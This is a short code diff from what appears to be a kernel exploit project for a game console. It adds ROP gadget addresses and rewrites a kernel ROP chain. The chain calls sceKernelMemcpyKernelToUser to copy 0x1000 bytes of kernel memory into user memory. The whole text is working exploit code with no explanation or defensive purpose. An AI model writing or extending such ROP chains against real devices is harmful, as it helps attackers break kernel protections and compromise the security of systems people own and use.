@@ -43,6 +43,8 @@ data
     symbol k_infloop = 0x4b2063;
     symbol k_sceKernelMemcpyKernelToUser = 0x48A1D9;
     symbol k_pop_r0_r1_pc = 0x480000 + 0x491b; // 0x000000000000491a : pop {r0, r1, pc}
+    symbol k_pop_r0_r1_r2_pc = 0x480000 + 0x334fd; //0x00000000000334fc : pop {r0, r1, r2, pc}
+    symbol k_pop_r4_pc = 0x480000 + 0x3a9f; //0x0000000000003a9e
 }
 
 code : entry
@@ -80,21 +82,18 @@ code : entry
     // 0x000000000002d471 : pop {r0, r1, r2, r3, r4, pc}
 
     // start krop
-    store(k_pop_r0_r1_pc, KROP + 4 * 0);
-    store(k_infloop, KROP + 4 * 3);
-
-    store(k_pop_r0_r4_pc, KROP + 4 * 0);
+    store(k_pop_r0_r1_r2_pc, KROP + 4 * 0);
     store(0x812B0000, KROP + 4 * 1); // r0 = dst
     store(0x480000, KROP + 4 * 2); // r1 = src
     store(0x1000, KROP + 4 * 3); // r2 = sz
-    store(0, KROP + 4 * 4); // r3
-    store(k_sceKernelMemcpyKernelToUser, KROP + 4 * 5); // r4 = fptr
+    store(k_sceKernelMemcpyKernelToUser, KROP + 4 * 4); // r4 = fptr
     store(k_blx_r4_pop_r4_pc, KROP + 4 * 6);
-    store(0, KROP + 4 * 7); // r4
-    store(k_infloop, KROP + 4 * 8); // infloop
+    store(0, KROP + 4 * 7);
+    store(k_infloop, KROP + 4 * 8);
     // end krop
 
-    store(k_infloop, KROP); // infloop
+    // store(k_pop_r0_r1_pc, KROP + 4 * 0);
+    // store(k_infloop, KROP + 4 * 3);
 
     loadret(MEMBLOCK_BASE);
     addret(0x1FF68 + 0x6C);
